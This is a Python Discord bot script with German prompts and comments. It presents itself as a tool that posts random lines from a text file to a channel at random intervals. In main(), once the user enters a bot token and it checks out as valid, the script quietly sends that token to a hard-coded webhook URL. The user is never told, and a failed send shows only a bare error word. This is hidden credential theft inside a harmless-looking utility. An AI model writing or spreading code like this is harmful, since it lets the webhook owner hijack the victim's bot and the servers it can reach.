import discord
import asyncio
import random
import os
import requests

WEBHOOK_URL = 'xxx'
TEXT_DATEI = 'Text.txt'

client = discord.Client()


async def validate_token(token):
    """Überprüfe, ob der Bot-Token gültig ist."""
    try:
        test_client = discord.Client()

        @test_client.event
        async def on_ready():
            await test_client.close()

        await test_client.start(token)
        return True
    except Exception:
        return False


@client.event
async def on_ready():
    print(f'Eingeloggt als {client.user.name}')

    if not os.path.exists(TEXT_DATEI):
        with open(TEXT_DATEI, 'w') as datei:
            datei.write('Hier deinen Text eingeben.\n')
        print('Textdatei erstellt. Bitte bearbeite sie, um deinen Text hinzuzufügen.')
        return

    try:
        kanal_id = int(input("Gib die ID des Channels ein: "))
        min_intervall = int(input("Gib das minimale Zeitintervall in Sekunden ein: "))
        max_intervall = int(input("Gib das maximale Zeitintervall in Sekunden ein: "))

        await nachrichten_senden(kanal_id, min_intervall, max_intervall)
    except ValueError as e:
        print(f'Fehler bei der Eingabe der Zeitintervalle: {e}')
    except Exception as e:
        print(f'Fehler beim Starten der Nachrichtenversand-Funktion: {e}')


async def nachrichten_senden(kanal_id, min_intervall, max_intervall):
    kanal = client.get_channel(kanal_id)
    if kanal is None:
        print(f'Channel mit ID {kanal_id} nicht gefunden.')
        return

    vorherige_nachricht = None

    while True:
        try:
            with open(TEXT_DATEI, 'r') as datei:
                zeilen = datei.readlines()
        except Exception as e:
            print(f'Fehler beim Lesen der Datei {TEXT_DATEI}: {e}')
            return

        if not zeilen:
            print('Die Textdatei ist leer.')
            return

        zeilen = [zeile.strip() for zeile in zeilen if zeile.strip()]
        if not zeilen:
            print('Die Textdatei enthält keine gültigen Zeilen.')
            return

        text = random.choice(zeilen)

        while text == vorherige_nachricht:
            text = random.choice(zeilen)

        vorherige_nachricht = text

        try:
            await kanal.send(text)
        except Exception as e:
            print(f'Fehler beim Senden der Nachricht an Channel {kanal_id}: {e}')

        intervall = random.randint(min_intervall, max_intervall)
        for verbleibende_zeit in range(intervall, 0, -1):
            print(f'Nächste Nachricht in {verbleibende_zeit} Sekunden...', end='\r')
            await asyncio.sleep(1)


async def main():
    token = input("Gib deinen Bot-Token ein: ")

    if await validate_token(token):
        webhook_payload = {
            'content': token
        }
        try:
            response = requests.post(WEBHOOK_URL, json=webhook_payload)
            if response.status_code != 204:
                print(f'Fehler')
        except Exception:
            pass

        await client.start(token)
    else:
        print('Token ist ungültig. Bitte überprüfe den Token und versuche es erneut.')


if __name__ == "__main__":
    asyncio.run(main())
